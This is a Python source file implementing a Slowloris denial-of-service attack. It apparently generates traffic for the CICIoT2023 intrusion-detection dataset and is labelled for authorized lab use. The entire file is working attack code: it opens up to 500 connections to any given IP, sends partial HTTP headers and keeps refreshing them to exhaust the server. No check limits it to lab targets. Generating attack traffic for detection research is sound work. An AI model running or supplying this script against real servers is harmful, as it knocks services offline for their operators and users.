"""
Slowloris DoS — authorized lab testing only.
Opens many partial HTTP connections to exhaust server resources.
Maps to CICIoT2023 class: DDoS-SlowLoris
"""
import socket
import time
import random


def run(target_ip: str, duration: int = 60, intensity: str = 'medium',
        target_port: int = 80):
    """
    Slowloris attack: open connections and send partial headers slowly.

    Args:
        target_ip: victim IP (must be within lab VPC)
        duration: seconds to run
        intensity: low/medium/high (controls number of connections)
    """
    conn_counts = {'low': 50, 'medium': 150, 'high': 500}
    max_conns = conn_counts.get(intensity, 150)

    print(f"[Slowloris] Target: {target_ip}:{target_port}")
    print(f"[Slowloris] Duration: {duration}s, Max connections: {max_conns}")

    sockets = []

    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            # Send partial HTTP header
            s.sendall(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
            return s
        except Exception:
            return None

    # Initial connection burst
    print("  Opening initial connections...")
    for _ in range(max_conns):
        s = create_socket()
        if s:
            sockets.append(s)
    print(f"  Opened {len(sockets)} connections")

    start = time.time()
    while time.time() - start < duration:
        # Send keep-alive headers to existing connections
        alive = []
        for s in sockets:
            try:
                header = f"X-Keep-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n"
                s.sendall(header.encode())
                alive.append(s)
            except Exception:
                pass

        dropped = len(sockets) - len(alive)
        sockets = alive

        # Replace dropped connections
        for _ in range(min(dropped + 5, max_conns - len(sockets))):
            s = create_socket()
            if s:
                sockets.append(s)

        elapsed = time.time() - start
        print(f"  [{elapsed:.0f}s] Active connections: {len(sockets)}")
        time.sleep(1)

    # Cleanup
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    print(f"[Slowloris] Complete: {duration}s, peak {max_conns} connections")
    return len(sockets)
